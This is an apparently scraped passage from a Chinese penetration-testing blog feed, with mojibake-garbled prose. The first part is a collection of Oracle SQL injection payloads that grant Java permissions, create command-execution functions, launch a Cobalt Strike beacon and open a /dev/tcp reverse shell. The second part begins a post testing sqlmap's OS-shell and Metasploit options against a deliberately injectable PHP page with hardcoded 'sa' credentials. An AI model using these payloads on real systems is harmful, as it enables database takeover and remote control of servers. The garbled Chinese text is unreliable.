dual</span><br></pre></td></tr></table></figure>

<ul>
<li>èµ‹äºˆæ‰§è¡Œæƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºå‡½æ•°ï¼Œè¿”å›å€¼ä¸ºnull</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Command.exec(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>èµ‹äºˆå‡½æ•°æ‰§è¡Œæƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on LinxRunCMD to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on cmd to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># âš ï¸æ³¨æ„ï¼šè¯¥æ–¹æ³•åœ¨Windowsæ— æ³•é€‚ç”¨æˆªæ–­é—®é¢˜- - åªèƒ½æ‰§è¡Œè¿ç»­å­—ç¬¦å‘½ä»¤ï¼Œç»“æœè¾“å‡ºå¸¦æœ‰æˆªæ–­ä¹Ÿæ— æ³•ï¼Œã€‚ã€‚æ‰§è¡Œdirç›´æ¥å¡æ­»äº†ã€‚ã€‚</span><br><span class="line">select sys.LinxRunCMD(&#39;&#x2F;bin&#x2F;bash -c &#x2F;usr&#x2F;bin&#x2F;whoami&#39;) from dual</span><br><span class="line"># âš ï¸æ³¨æ„ï¼šç»“æœä¸­å¸¦æœ‰æˆªæ–­å­—ç¬¦åˆ™æŠ¥é”™ã€‚æ¯”å¦‚:net userï¼Œç›´æ¥æ‰§è¡Œ.exeæ²¡é—®é¢˜ã€‚è¿™é‡Œä¸ºCSçš„ğŸ</span><br><span class="line">select sys.cmd(&#39;C:\Documents and Settings\Administrator\æ¡Œé¢\beacon.exe&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/023.png"></p>
<h3 id="dbms-xmlquery-newcontext-1"><a href="#dbms-xmlquery-newcontext-1" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><p>åœ¨æœ¬åœ°Windowsä¸‹10gæ²¡æœ‰æˆåŠŸï¼Œ11gæ˜¯å¯ä»¥çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºJAVAåŒ…</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># èµ‹äºˆå½“å‰ç”¨æˆ·JAVAæƒé™ï¼Œ èµ‹æƒå¤±è´¥ä¼šæŠ¥é”™ã€‚</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;YY&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual;</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºå‡½æ•°</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># åˆ é™¤åˆ›å»ºçš„å‡½æ•°</span><br><span class="line">drop function LinxRunCMD</span><br><span class="line"># æ‰§è¡Œå‘½ä»¤</span><br><span class="line">select LinxRunCMD(&#39;whoami&#39;) from dual</span><br></pre></td></tr></table></figure>

<h3 id="Linuxåå¼¹shell"><a href="#Linuxåå¼¹shell" class="headerlink" title="Linuxåå¼¹shell"></a>Linuxåå¼¹shell</h3><ul>
<li>åˆ›å»ºJAVA Source</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa&#x3D;&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;sh&quot;&#125;;Process p&#x3D;Runtime.getRuntime().exec(aaa);&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>æˆäºˆæƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.net.SocketPermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;*&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºå‡½æ•°</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function reversetcp RETURN VARCHAR2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;shell.run() return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>èµ‹äºˆæ‰§è¡Œæƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on reversetcp to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>è°ƒç”¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys.reversetcp from dual</span><br></pre></td></tr></table></figure>



<p>Oracleåˆ©ç”¨å·¥å…·ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlU2hlbGwlRUYlQkMlODglRTUlQTQlQTclRTQlQkQlQUMlRTUlQkElOTQlRTglQUYlQTUlRTYlOTglQUYlRTYlQjIlQTElRTYlOUMlODklRTYlOTclQjYlRTklOTclQjQlRTUlQUUlOEMlRTUlOTYlODQlRUYlQkMlODk=">https://github.com/jas502n/oracleShellï¼ˆå¤§ä½¬åº”è¯¥æ˜¯æ²¡æœ‰æ—¶é—´å®Œå–„ï¼‰<i class="fa fa-external-link-alt"></i></span></p>
<p>[1] <span class="exturl" data-url="aHR0cHM6Ly9yZWRuM2NrLmdpdGh1Yi5pby8yMDE4LzA0LzI1L09yYWNsZSVFNiVCMyVBOCVFNSU4NSVBNS0lRTUlOTElQkQlRTQlQkIlQTQlRTYlODklQTclRTglQTElOEMtU2hlbGwlRTUlOEYlOEQlRTUlQkMlQjkv">https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/<i class="fa fa-external-link-alt"></i></span></p>
<p>[2] <span class="exturl" data-url="aHR0cHM6Ly93d3cudHIweS53YW5nLzIwMTkvMDQvMTYvT3JhY2xlJUU2JUIzJUE4JUU1JTg1JUE1JUU2JThDJTg3JUU1JThDJTk3L2luZGV4Lmh0bWwjJUU2JThBJUE1JUU5JTk0JTk5JUU2JUIzJUE4JUU1JTg1JUE1">https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5<i class="fa fa-external-link-alt"></i></span></p>
<p>[3] <span class="exturl" data-url="aHR0cDovL21lZGlhLmJsYWNraGF0LmNvbS9iaC11cy0xMC93aGl0ZXBhcGVycy9TaWRkaGFydGgvQmxhY2tIYXQtVVNBLTIwMTAtU2lkZGhhcnRoLUhhY2tpbmctT3JhY2xlLWZyb20tdGhlLVdlYi13cC5wZGY=">http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>ORACLE</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapå…³äºMSSQLæ‰§è¡Œå‘½ä»¤æ€è€ƒ</title>
    <url>/posts/6e52a8fb/</url>
    <content><![CDATA[<p>ç¢°åˆ°äº†å¾ˆå¤šæ¬¡sqlmapæ‰§è¡Œå‘½ä»¤æ— å›æ˜¾ï¼Œç„¶åè¯•äº†è¯»å–æ³¨å†Œè¡¨ï¼Œè”åŠ¨MSFï¼Œå‘ç°éƒ½å­˜åœ¨é—®é¢˜ï¼Œçœ‹äº†ä¸‹å‚æ•°ï¼Œæœ‰ä¸ªBOFï¼Œå°±ç ”ç©¶ä¸€ä¸‹ã€‚ç¬¬ä¸€æ¬¡åˆ†ææœ‰ç‚¹ç¹çã€‚ã€‚ã€‚</p>
<a id="more"></a>

<h2 id="0x00-ç¯å¢ƒæ¦‚è¿°"><a href="#0x00-ç¯å¢ƒæ¦‚è¿°" class="headerlink" title="0x00 ç¯å¢ƒæ¦‚è¿°"></a>0x00 ç¯å¢ƒæ¦‚è¿°</h2><p>ç¯å¢ƒè¯´æ˜ï¼š</p>
<ul>
<li><p>Windows 2003 + MSSQL + PHP5.2.17 (æ³¨æ„åˆ·æ–°ç¼“å­˜ â€“flush-session)</p>
</li>
<li><p>å…³é—­GPC</p>
</li>
<li><p>æ„é€ SQLæ³¨å…¥ï¼š</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$con = mssql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;sa&#x27;</span>,<span class="string">&#x27;server2005&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Erroe&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Connect OK.&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mssql_select_db(<span class="string">&#x27;sqlmap_test&#x27;</span>);</span><br><span class="line"><span class="comment"># $sql = &quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;;</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select id,name from admin where id=&quot;</span>.$id;</span><br><span class="line"></span><br><span class="line">$result = mssql_query($sql);</span><br><span class="line"><span class="comment">/* $row = mssql_fetch_array($result);</span></span><br><span class="line"><span class="comment">echo $row[0]; */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($list=mssql_fetch_array($result))</span><br><span class="line"> &#123;</span><br><span class="line">    print_r($list);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x01-æµ‹è¯•sqlmapå‘½ä»¤"><a href="#0x01-æµ‹è¯•sqlmapå‘½ä»¤" class="headerlink" title="0x01 æµ‹è¯•sqlmapå‘½ä»¤"></a>0x01 æµ‹è¯•sqlmapå‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-shell</span><br><span class="line">--sql-shell</span><br><span class="line">--os-pwn</span><br><span class="line">--os-smbrelay</span><br><span class="line">--os-bof</span><br><span class="line">--reg-[read&#x2F;add&#x2F;del]</span><br></pre></td></tr></table></figure>

<h3 id="â€“os-shell"><a href="#â€“os-shell" class="headerlink" title="â€“os-shell"></a>â€“os-shell</h3><p>è¯¥å‚æ•°ä¸»è¦æ˜¯è°ƒç”¨xp_cmdshellæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<ul>
<li><p>æ‰§è¡Œ<code>--os-shell</code>,ä¹‹åç›´æ¥åœ¨æ•°æ®åº“ä¸­æŸ¥çœ‹ï¼Œå‘ç°å·²å¯ç”¨<code>xp_cmdshell</code>ã€‚å‘ç°èƒ½æ‰§è¡Œå‘½ä»¤,ä½†æ˜¯sqlmapæ— è¿”å›å€¼ã€‚åªèƒ½é€šè¿‡DNSå¤–å¸¦ã€‚ã€‚ã€‚</p>
<p><img src="/posts/6e52a8fb/001.png" alt="aa"></p>
</li>
</ul>
<h3 id="â€“sql-shell"><a href="#â€“sql-shell" class="headerlink" title="â€“sql-shell"></a>â€“sql-shell</h3><p>ä¸»è¦ç”¨äºæ˜¯æ‰§è¡Œæ•°æ®åº“è¯­å¥ã€‚</p>
<ul>
<li>ä½¿ç”¨<code>--sql-shell</code>ï¼Œæµ‹è¯•èƒ½å¦é€šè¿‡<code>sql-shell</code>æ‰‹åŠ¨å¼€å¯<code>xp_cmdshell</code>ã€‚ç»“æœå‘ç°æ— æ³•å¼€å¯xp_cmdshellã€‚æ‰‹åŠ¨å¼€å¯<code>xp_cmdshell</code>åï¼Œ<code>sql-shell</code>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œsqlmapæ— è¿”å›å€¼ã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/002.png" alt="image-20200428194326597"></p>
<h3 id="â€“os-pwn"><a href="#â€“os-pwn" class="headerlink" title="â€“os-pwn"></a>â€“os-pwn</h3><p>è·å–OOBshellã€MSF shellã€VNCã€‚ã€‚ã€‚</p>
<ul>
<li><code>--os-pwn</code>è·å–OOB shellã€Meterpreteræˆ–VNCã€‚åœ¨é»˜è®¤å…³é—­<code>xp_cmdshell</code>æƒ…å†µä¸‹ï¼Œè¯¥å‚æ•°æ— æ³•å¼€å¯<code>xp_cmdshell</code>ã€‚</li>
</ul>
<p>æ‰‹åŠ¨å¼€å¯<code>xp_cmdshell</code>ä»¥åï¼Œä½¿ç”¨sqlmapå‚æ•°ï¼š<code>--os-pwn --msf-path /opt/msf/</code>,ä¼šå…ˆä¸Šä¼ ä¸€ä¸ªpaylaodã€‚æŸ¥çœ‹SQLAMPä¸Šä¼ æ–‡ä»¶çš„æ–¹å¼ä¸€å…±æœ‰4ç§:PowerShell,Debug,Vbsè„šæœ¬,Certutilã€‚å¦‚æœç¬¬ä¸€ç§æ–¹å¼å¤±è´¥ä¼šæç¤ºä¸‹ä¸€ç§æ–¹å¼ï¼Œæˆ‘è¿™é‡Œæµ‹è¯•æ‰€æœ‰çš„é€šä¿¡æ–¹å¼ä»¥åŠpayloadï¼Œå‡å¤±è´¥ã€‚ã€‚ã€‚</p>
<p><img src="/posts/6e52a8fb/003.png" alt="image-20200428195336542"></p>
<h3 id="â€“os-smbrelay"><a href="#â€“os-smbrelay" class="headerlink" title="â€“os-smbrelay"></a>â€“os-smbrelay</h3><p>ä¸€æ¬¡å•å‡»æç¤ºè¾“å…¥OOB shellã€Meterpreteræˆ–VNCã€‚è¯¥å‚æ•°æä¾›äº†äº”ç§è¿æ¥æ–¹å¼ï¼Œä¸‰ç§payloadç±»å‹ï¼Œä¸¤ä¸ªSMBç«¯å£ã€‚å…¶åŸç†å°±æ˜¯è°ƒç”¨MSFçš„<code>windows/smb/smb_relay</code>æ¨¡å—ã€‚ã€‚ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> connection <span class="built_in">type</span> <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535</span><br><span class="line">[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP</span><br><span class="line">[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS</span><br><span class="line">[5] Bind TCP: Listen on the database host <span class="keyword">for</span> a connection</span><br><span class="line">&gt;</span><br><span class="line">what is the <span class="built_in">local</span> address? [Enter <span class="keyword">for</span> <span class="string">&#x27;192.168.90.17&#x27;</span> (detected)]</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">local</span> port number <span class="keyword">do</span> you want to use? [7545]</span><br><span class="line"><span class="built_in">which</span> payload <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line"><span class="built_in">which</span> SMB port <span class="keyword">do</span> you want to use?</span><br><span class="line">[1] 139/TCP</span><br><span class="line">[2] 445/TCP (default)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/6e52a8fb/004.png" alt="image-20200428195514583"></p>
<h3 id="â€“os-bof"><a href="#â€“os-bof" class="headerlink" title="â€“os-bof"></a>â€“os-bof</h3><p>å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨ã€‚å‚æ•°æä¾›äº†äº”ç§è¿æ¥æ–¹å¼ï¼Œä¸‰ç§payloadï¼ŒåäºŒç§payloadç¼–ç æ–¹å¼ã€‚</p>
<p>ç»è¿‡æµ‹è¯•è¿˜æ˜¯å¤±è´¥çš„ã€‚ã€‚ã€‚</p>
<h3 id="â€“reg-read-add-del"><a href="#â€“reg-read-add-del" class="headerlink" title="â€“reg-[read/add/del]"></a>â€“reg-[read/add/del]</h3><ul>
<li>è¯»å–/æ·»åŠ /ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä¼šä¸Šä¼ .batæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯å¹¶æœªæ¥å—åˆ°è¯»å–çš„å€¼..</li>
</ul>
<p><img src="/posts/6e52a8fb/005.png" alt="image-20200429172318871"></p>
<h2 id="0x02-åæ€"><a href="#0x02-åæ€" class="headerlink" title="0x02 åæ€"></a>0x02 åæ€</h2><p>ç»è¿‡ä»¥ä¸Šæµ‹è¯•ï¼ˆå…³é—­GPCä¸‹ï¼‰ï¼Œè‚¯å®šæ˜¯æœ‰å¾ˆå¤šç–‘é—®çš„ï¼Œè¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¸ºä»€ä¹ˆ--os-shellæ‰§è¡Œå‘½ä»¤åsqlmapæ— è¿”å›å€¼ï¼Ÿ</span><br><span class="line">ä¸ºä»€ä¹ˆ--os-pwnå‚æ•°ä¸Šä¼ æ–‡ä»¶å¤±è´¥ï¼Ÿ</span><br><span class="line">ä¸ºä»€ä¹ˆ--os-bofåˆ©ç”¨å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºä¹Ÿå¤±è´¥ï¼Ÿ</span><br><span class="line">ä¸ºä»€ä¹ˆè¯»å–æ³¨å†Œè¡¨æ—¶å€™æ–‡ä»¶ä¸Šä¼ äº†è€Œsqlmapæ— æ³•è·å–åˆ°ï¼Ÿ</span><br></pre></td></tr></table></figure>

<h3 id="å‘½ä»¤æ‰§è¡Œåæ€"><a href="#å‘½ä»¤æ‰§è¡Œåæ€" class="headerlink" title="å‘½ä»¤æ‰§è¡Œåæ€"></a>å‘½ä»¤æ‰§è¡Œåæ€</h3><p>ç»è¿‡ä»¥ä¸Šæµ‹è¯•ï¼Œä¸ºä»€ä¹ˆæ— æ³•æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿè¿™é‡Œå†æ¥å¤è¿°ä¸€éï¼Œæ‰¾ä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™æ ·ã€‚</p>
<ul>
<li>é¦–å…ˆç¡®å®šä¸€ä¸‹ï¼šå¤šè¯­å¥æ‰§è¡Œï¼Œä¹Ÿå³æ˜¯å †å æ³¨å…¥æ—¶å€™çš„è¿”å›å€¼ã€‚åªè¿”å›äº†ç¬¬ä¸€ä¸ªæŸ¥è¯¢<code>id=1</code>çš„å†…å®¹ã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/006.png" alt="image-20200428201228029"></p>
<ul>
<li>æŸ¥çœ‹ç›´æ¥åœ¨æ•°æ®åº“æ‰§è¡Œæ—¶çš„è¿”å›ï¼Œè¿”å›äº†ä¸¤æ¡ç»“æœã€‚</li>
</ul>
<p><img src="/posts/6e52a8fb/007.png" alt="image-20200428201425603"></p>
<ul>
